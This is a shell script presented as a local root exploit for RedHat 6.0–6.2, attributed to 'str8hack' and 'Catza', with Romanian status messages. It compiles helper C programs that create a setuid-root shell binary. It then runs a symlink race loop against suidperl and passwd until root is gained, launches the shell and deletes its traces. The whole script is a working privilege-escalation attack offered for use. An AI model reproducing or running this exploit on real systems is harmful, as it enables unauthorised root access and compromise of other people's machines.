#!/bin/sh
clear

echo "RedHat 6.2/6.1/6.0 local exploit modified by str8hack"
echo "-----------------------------------------"
echo "With great respect to Catza..."
echo

SUIDPERL=/usr/bin/suidperl
SUIDBIN=/usr/bin/passwd


if [ ! -u $SUIDPERL ]; then
  echo "[-] Naspa situatie se pare ca versiunea nu este RedHat"
  echo
  exit 0
fi


if [ ! -u $SUIDBIN ]; then
  echo "[-] Naspa situatie se pare ca versiunea nu este RedHat"
  echo
  exit 0
fi

echo "[+] Greul a trecut compilam programele ajutatoare..."
echo

cat >flare <<__eof__
#!/usr/bin/suidperl

print "Nimic nu ne mai poate oprii!... \n";

__eof__

cat >bighole.c <<__eof__
main() {
  setuid(0);
  setgid(0);
  chown("sush",0,0);
  chmod("sush",04755);
}
__eof__

cat >sush.c <<__eof__
main() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
__eof__

make bighole sush

echo

if [ ! -x ./sush ]; then
  echo "[-] Ups ... se pare ca RooT-ul nu are MAKE sau GCC functionale"
  echo 
  exit 0
fi


chmod 4755 ./flare

FILENAME='none

~!bighole

'
export interactive=1
PATH=.:$PATH

echo "[+] Exploatarea a inceput! - ar putea dura 5 minute"
echo "[+] Atentie!!! sistemul ar putea fii suprasolicitat"

while :; do
  ( ln -f -s $SUIDBIN "$FILENAME";usleep $RANDOM; nice -n +20 $SUIDPERL ./"$FILENAME" <./flare & ) &>/dev/null &
  ( usleep $RANDOM ; ln -f -s /dev/stdin "$FILENAME" ) &>/dev/null &
  if [ -u ./sush ]; then
    echo
    echo "[+] Hehe si suntem ROOT - Enjoy!"
    echo
    rm -f "$FILENAME" sush.c bighole bighole.c flare
    ./sush
    echo
    echo "[+] Multumim ca ati folosit systemele str8hack&Catza s.r.l :)"
    echo
    rm -f "$FILENAME" sush.c bighole bighole.c flare sush
  fi
  done
    exit 0


